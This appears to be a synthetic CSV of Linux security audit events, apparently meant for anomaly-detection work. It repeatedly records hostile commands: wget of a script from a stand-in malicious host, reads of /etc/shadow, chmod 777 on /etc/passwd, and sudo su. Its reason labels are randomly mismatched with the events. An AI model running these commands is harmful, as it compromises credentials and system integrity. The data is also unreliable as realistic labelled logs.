timestamp,user_id,event_type,resource,action,command,result,ip_address,session_id,reason
2025-05-03T10:02:17Z,U6025,exec,/usr/bin/wget,run,sudo su,success,10.0.0.254,61883,Privileged command executed
2025-05-02T11:25:17Z,U1055,file_access,/etc/shadow,write,,success,10.0.0.213,91129,Access to sensitive file
2025-05-05T03:31:17Z,U7592,file_access,/etc/shadow,write,,success,10.0.0.97,95912,Administrative task
2025-04-30T08:25:17Z,U9896,exec,/usr/bin/top,run,sudo su,success,10.0.0.89,82317,Administrative task
2025-05-04T23:28:17Z,U9167,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.222,11858,Privileged command executed
2025-05-05T15:01:17Z,U5231,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,87725,Access to sensitive file
2025-05-01T10:34:17Z,U4963,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.208,52531,Normal command execution
2025-05-07T00:31:17Z,U5021,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.154,53813,Privileged command executed
2025-05-03T08:13:17Z,U8241,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.53,26048,Access to sensitive file
2025-05-03T18:12:17Z,U9671,file_access,/etc/shadow,write,,success,10.0.0.183,27825,Access to sensitive file
2025-05-06T00:28:17Z,U4855,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.183,22779,Administrative task
2025-05-07T00:18:17Z,U6701,file_access,/etc/shadow,write,,success,10.0.0.158,95503,Privileged command executed
2025-05-03T00:02:17Z,U1881,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.123,63870,Administrative task
2025-05-01T10:41:17Z,U5667,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,failure,10.0.0.208,45052,Command not found
2025-05-05T13:37:17Z,U7803,exec,/bin/bash,run,ls -al /etc,failure,10.0.0.94,15503,Permission denied
2025-05-01T18:24:17Z,U9616,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.202,50580,Administrative task
2025-05-04T03:29:17Z,U4697,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.178,56225,Access to sensitive file
2025-05-04T06:39:17Z,U4198,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.152,59903,Routine system scan
2025-05-04T00:36:17Z,U3371,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.236,20735,Execution blocked by policy
2025-05-01T23:11:17Z,U4506,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.92,31459,Administrative task
2025-05-02T04:53:17Z,U1451,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.130,20029,Normal command execution
2025-05-06T23:36:17Z,U6088,file_access,/etc/shadow,read,,success,10.0.0.222,60032,Access to sensitive file
2025-04-30T21:00:17Z,U4448,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.137,23786,Access to sensitive file
2025-05-03T10:05:17Z,U4114,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.252,33181,Access to sensitive file
2025-04-30T13:49:17Z,U1781,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.91,17941,Routine system scan
2025-05-01T12:30:17Z,U6480,file_access,/etc/shadow,read,,success,10.0.0.148,98846,Privileged command executed
2025-05-01T15:28:17Z,U6420,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.179,70551,Routine system scan
2025-05-03T13:25:17Z,U6743,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.175,65703,Privileged command executed
2025-04-30T20:23:17Z,U9612,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.28,90769,Administrative task
2025-05-05T00:56:17Z,U6727,file_access,/etc/shadow,write,,success,10.0.0.163,32399,Privileged command executed
2025-05-02T10:14:17Z,U5625,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.152,32016,Segmentation fault
2025-05-06T03:04:17Z,U8575,file_access,/etc/passwd,read,,success,10.0.0.221,16146,Privileged command executed
2025-05-02T08:26:17Z,U2622,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.62,27973,Administrative task
2025-05-06T02:20:17Z,U2196,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.221,78604,Access to sensitive file
2025-05-05T22:09:17Z,U3419,exec,/usr/bin/top,run,sudo su,success,10.0.0.6,17484,Administrative task
2025-05-06T09:33:17Z,U6665,file_access,/etc/shadow,write,,success,10.0.0.252,54700,Access to sensitive file
2025-05-02T12:47:17Z,U3184,file_access,/etc/shadow,write,,success,10.0.0.25,69032,Access to sensitive file
2025-05-05T20:57:17Z,U2388,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.29,69110,Administrative task
2025-05-05T05:24:17Z,U2964,exec,/bin/bash,run,ls -al /etc,success,10.0.0.225,73858,Privileged command executed
2025-05-02T16:41:17Z,U1246,file_access,/etc/shadow,read,,success,10.0.0.71,56183,Administrative task
2025-05-02T15:34:17Z,U6628,file_access,/etc/passwd,read,,success,10.0.0.218,15909,Access to sensitive file
2025-05-06T00:39:17Z,U1393,file_access,/etc/passwd,read,,success,10.0.0.167,28274,Normal command execution
2025-05-01T03:29:17Z,U3331,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.201,88123,Privileged command executed
2025-05-05T04:25:17Z,U1249,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,79501,Privileged command executed
2025-05-03T21:43:17Z,U3123,file_access,/etc/passwd,read,,success,10.0.0.223,96233,Routine system scan
2025-05-05T17:11:17Z,U7533,file_access,/etc/shadow,read,,success,10.0.0.216,37956,Administrative task
2025-05-04T19:00:17Z,U2051,file_access,/etc/passwd,read,,success,10.0.0.147,54976,Normal command execution
2025-05-04T10:59:17Z,U8656,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.74,81286,Permission denied
2025-05-03T22:09:17Z,U1659,file_access,/etc/passwd,write,,success,10.0.0.89,93455,Access to sensitive file
2025-05-01T18:52:17Z,U6733,exec,/bin/sudo,run,sudo su,success,10.0.0.143,13342,Privileged command executed
2025-05-03T19:34:17Z,U3891,file_access,/etc/passwd,write,,success,10.0.0.168,12791,Administrative task
2025-05-07T03:21:17Z,U6380,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.200,82667,Privileged command executed
2025-05-02T14:33:17Z,U6805,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.213,15079,Administrative task
2025-05-04T22:40:17Z,U9501,file_access,/etc/passwd,write,,failure,10.0.0.103,21846,Segmentation fault
2025-05-01T09:02:17Z,U6517,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,97267,Access to sensitive file
2025-05-02T04:49:17Z,U5392,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.210,24890,Administrative task
2025-05-03T23:55:17Z,U8450,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.62,17404,Execution blocked by policy
2025-05-02T00:27:17Z,U3096,exec,/usr/bin/top,run,cat /etc/shadow,failure,10.0.0.93,35934,Segmentation fault
2025-05-01T03:51:17Z,U9401,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.232,94845,Normal command execution
2025-04-30T11:51:17Z,U2676,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.246,44549,Access to sensitive file
2025-05-06T03:46:17Z,U5815,exec,/bin/bash,run,chmod 777 /etc/passwd,failure,10.0.0.12,50986,Execution blocked by policy
2025-05-06T18:39:17Z,U9203,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.203,61250,Administrative task
2025-04-30T22:05:17Z,U8835,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,98057,Administrative task
2025-04-30T17:18:17Z,U6881,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.128,72817,Access to sensitive file
2025-05-05T23:01:17Z,U4173,file_access,/etc/shadow,write,,success,10.0.0.239,34954,Routine system scan
2025-05-06T16:40:17Z,U4779,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.36,73709,Normal command execution
2025-05-02T09:37:17Z,U4782,file_access,/etc/passwd,write,,failure,10.0.0.183,12867,Permission denied
2025-05-05T06:17:17Z,U6742,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.234,56841,Routine system scan
2025-04-30T06:58:17Z,U9473,exec,/bin/sudo,run,sudo su,failure,10.0.0.36,66062,Permission denied
2025-05-06T21:50:17Z,U8665,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.204,16015,Privileged command executed
2025-05-06T17:31:17Z,U2783,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.248,28545,Privileged command executed
2025-05-04T14:39:17Z,U5479,file_access,/etc/shadow,write,,success,10.0.0.53,18670,Normal command execution
2025-05-04T22:38:17Z,U9940,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.118,94614,Access to sensitive file
2025-05-04T18:47:17Z,U1628,file_access,/etc/shadow,read,,success,10.0.0.232,26466,Normal command execution
2025-05-06T18:31:17Z,U4206,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.34,23277,Administrative task
2025-05-04T17:19:17Z,U2768,file_access,/etc/passwd,write,,failure,10.0.0.154,59917,Command not found
2025-05-01T22:53:17Z,U3481,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.239,25041,Access to sensitive file
2025-04-30T10:30:17Z,U3202,file_access,/etc/shadow,write,,success,10.0.0.152,98041,Privileged command executed
2025-05-03T11:10:17Z,U5932,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.40,99459,Access to sensitive file
2025-05-06T11:50:17Z,U5674,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.75,33090,Segmentation fault
2025-05-02T02:41:17Z,U6900,file_access,/etc/shadow,read,,success,10.0.0.25,33355,Normal command execution
2025-05-01T15:39:17Z,U5288,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.131,67850,Administrative task
2025-05-03T07:04:17Z,U8801,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.134,50469,Invalid argument
2025-05-02T02:43:17Z,U1704,file_access,/etc/shadow,write,,failure,10.0.0.115,76303,Invalid argument
2025-05-06T15:56:17Z,U2519,file_access,/etc/shadow,read,,success,10.0.0.93,76180,Administrative task
2025-05-01T05:46:17Z,U6327,exec,/bin/sudo,run,sudo su,success,10.0.0.104,31197,Administrative task
2025-05-02T00:34:17Z,U4544,file_access,/etc/shadow,read,,failure,10.0.0.2,78054,Permission denied
2025-05-01T05:49:17Z,U8576,file_access,/etc/shadow,write,,success,10.0.0.99,42839,Routine system scan
2025-05-01T15:24:17Z,U1480,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.186,27881,Access to sensitive file
2025-05-03T18:43:17Z,U7297,exec,/bin/sudo,run,chmod 777 /etc/passwd,failure,10.0.0.83,93527,Permission denied
2025-05-03T08:20:17Z,U1747,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.213,67177,Normal command execution
2025-05-02T04:38:17Z,U8294,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.171,72836,Invalid argument
2025-05-04T12:16:17Z,U2785,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.59,93883,Administrative task
2025-05-01T09:23:17Z,U5472,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.23,82748,Access to sensitive file
2025-05-02T12:21:17Z,U1351,file_access,/etc/shadow,read,,success,10.0.0.39,47178,Privileged command executed
2025-05-04T18:16:17Z,U5752,exec,/usr/bin/top,run,sudo su,success,10.0.0.40,83582,Administrative task
2025-05-01T06:59:17Z,U3693,file_access,/etc/passwd,read,,success,10.0.0.64,39990,Access to sensitive file
2025-05-03T13:57:17Z,U5764,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.236,30604,Privileged command executed
2025-05-02T14:03:17Z,U2285,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.50,64296,Administrative task
2025-05-01T02:48:17Z,U2525,exec,/bin/bash,run,cat /etc/shadow,failure,10.0.0.15,62708,Command not found
2025-05-06T17:54:17Z,U4634,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.83,70795,Administrative task
2025-05-07T00:21:17Z,U9646,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.63,52161,Invalid argument
2025-05-02T02:57:17Z,U4528,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.162,57785,Permission denied
2025-05-05T21:47:17Z,U5508,file_access,/etc/passwd,write,,failure,10.0.0.5,20637,Execution blocked by policy
2025-05-04T11:20:17Z,U9526,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.30,89448,Routine system scan
2025-05-02T16:40:17Z,U6079,exec,/bin/sudo,run,sudo su,success,10.0.0.189,88568,Access to sensitive file
2025-05-05T11:35:17Z,U1275,file_access,/etc/passwd,read,,success,10.0.0.200,97483,Administrative task
2025-05-05T21:58:17Z,U4460,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.151,97974,Permission denied
2025-05-01T22:51:17Z,U9299,file_access,/etc/shadow,write,,success,10.0.0.137,37936,Access to sensitive file
2025-05-06T04:15:17Z,U8591,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.182,40129,Normal command execution
2025-05-05T06:29:17Z,U7708,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.158,63866,Routine system scan
2025-05-04T15:46:17Z,U7800,file_access,/etc/shadow,read,,failure,10.0.0.82,47494,Permission denied
2025-05-06T09:06:17Z,U1654,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.139,97593,Normal command execution
2025-05-07T03:17:17Z,U6436,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.163,96452,Routine system scan
2025-05-04T16:18:17Z,U8092,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.103,56101,Normal command execution
2025-05-04T23:14:17Z,U4074,file_access,/etc/shadow,write,,success,10.0.0.254,25009,Administrative task
2025-05-01T07:08:17Z,U1036,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.143,27011,Invalid argument
2025-05-03T01:12:17Z,U1913,file_access,/etc/shadow,read,,success,10.0.0.73,64688,Access to sensitive file
2025-05-06T03:05:17Z,U5131,file_access,/etc/shadow,write,,success,10.0.0.221,95731,Administrative task
2025-05-01T10:08:17Z,U8217,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,77623,Access to sensitive file
2025-05-05T06:40:17Z,U8954,file_access,/etc/passwd,write,,success,10.0.0.252,96538,Privileged command executed
2025-05-07T01:42:17Z,U5732,file_access,/etc/passwd,read,,failure,10.0.0.232,26260,Execution blocked by policy
2025-05-05T11:38:17Z,U4251,file_access,/etc/shadow,read,,failure,10.0.0.88,22725,Command not found
2025-05-01T04:45:17Z,U8293,file_access,/etc/passwd,write,,success,10.0.0.79,96594,Privileged command executed
2025-04-30T15:19:17Z,U9447,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.230,11948,Privileged command executed
2025-05-03T19:12:17Z,U4652,file_access,/etc/passwd,read,,success,10.0.0.193,32350,Privileged command executed
2025-05-05T07:09:17Z,U6478,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.134,69949,Normal command execution
2025-04-30T20:09:17Z,U6500,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.46,88027,Normal command execution
2025-05-06T00:00:17Z,U5510,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.158,73665,Administrative task
2025-04-30T17:33:17Z,U7190,file_access,/etc/shadow,write,,failure,10.0.0.74,83003,Command not found
2025-05-03T16:36:17Z,U6914,file_access,/etc/passwd,write,,success,10.0.0.25,83054,Access to sensitive file
2025-05-02T17:36:17Z,U6542,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,60248,Normal command execution
2025-05-05T11:14:17Z,U9962,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.254,33171,Normal command execution
2025-05-05T10:20:17Z,U2496,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.148,39757,Normal command execution
2025-05-01T04:34:17Z,U1080,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.1,69441,Normal command execution
2025-05-02T21:17:17Z,U1804,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.117,19141,Routine system scan
2025-05-04T04:57:17Z,U9850,file_access,/etc/shadow,read,,success,10.0.0.224,68010,Privileged command executed
2025-05-05T20:14:17Z,U1915,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,96952,Normal command execution
2025-05-05T12:16:17Z,U2537,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.127,45413,Access to sensitive file
2025-05-05T13:26:17Z,U6530,file_access,/etc/shadow,write,,success,10.0.0.133,73344,Privileged command executed
2025-05-01T13:22:17Z,U4281,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.244,55155,Permission denied
2025-04-30T15:28:17Z,U6319,file_access,/etc/passwd,read,,success,10.0.0.98,48204,Routine system scan
2025-05-07T01:13:17Z,U6106,exec,/bin/bash,run,ls -al /etc,success,10.0.0.42,79190,Normal command execution
2025-05-01T13:06:17Z,U4063,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.200,91443,Permission denied
2025-05-05T06:12:17Z,U2454,file_access,/etc/shadow,read,,success,10.0.0.80,54171,Normal command execution
2025-05-01T05:22:17Z,U4339,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.199,42728,Administrative task
2025-05-02T00:05:17Z,U5431,file_access,/etc/passwd,read,,success,10.0.0.195,21658,Normal command execution
2025-05-02T07:10:17Z,U8768,exec,/usr/bin/top,run,ls -al /etc,failure,10.0.0.30,83891,Command not found
2025-05-01T10:57:17Z,U9837,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,34068,Access to sensitive file
2025-05-01T17:09:17Z,U4262,file_access,/etc/shadow,read,,failure,10.0.0.202,12813,Permission denied
2025-05-03T15:33:17Z,U5520,file_access,/etc/shadow,write,,failure,10.0.0.47,27726,Execution blocked by policy
2025-05-05T10:08:17Z,U5242,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.89,52384,Segmentation fault
2025-05-04T17:02:17Z,U9942,file_access,/etc/passwd,read,,success,10.0.0.86,73061,Administrative task
2025-05-06T12:52:17Z,U3011,exec,/usr/bin/wget,run,ls -al /etc,failure,10.0.0.25,75591,Permission denied
2025-05-02T18:36:17Z,U2986,file_access,/etc/passwd,write,,success,10.0.0.30,21028,Routine system scan
2025-05-05T00:02:17Z,U3719,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.231,30181,Access to sensitive file
2025-05-04T16:55:17Z,U6803,file_access,/etc/shadow,write,,success,10.0.0.1,55161,Routine system scan
2025-05-01T20:15:17Z,U2033,file_access,/etc/shadow,read,,failure,10.0.0.162,82468,Permission denied
2025-04-30T12:42:17Z,U6639,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.8,59375,Access to sensitive file
2025-05-02T04:52:17Z,U2964,file_access,/etc/passwd,write,,success,10.0.0.71,92092,Administrative task
2025-05-04T13:55:17Z,U8000,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.216,74533,Normal command execution
2025-05-04T17:00:17Z,U5862,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.99,55630,Normal command execution
2025-05-05T01:05:17Z,U4002,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.178,87664,Normal command execution
2025-05-06T15:32:17Z,U1971,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.107,68158,Routine system scan
2025-05-02T20:45:17Z,U2522,file_access,/etc/passwd,write,,success,10.0.0.114,39531,Access to sensitive file
2025-04-30T11:34:17Z,U9981,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,41121,Routine system scan
2025-05-02T06:31:17Z,U8169,file_access,/etc/passwd,read,,success,10.0.0.252,74747,Routine system scan
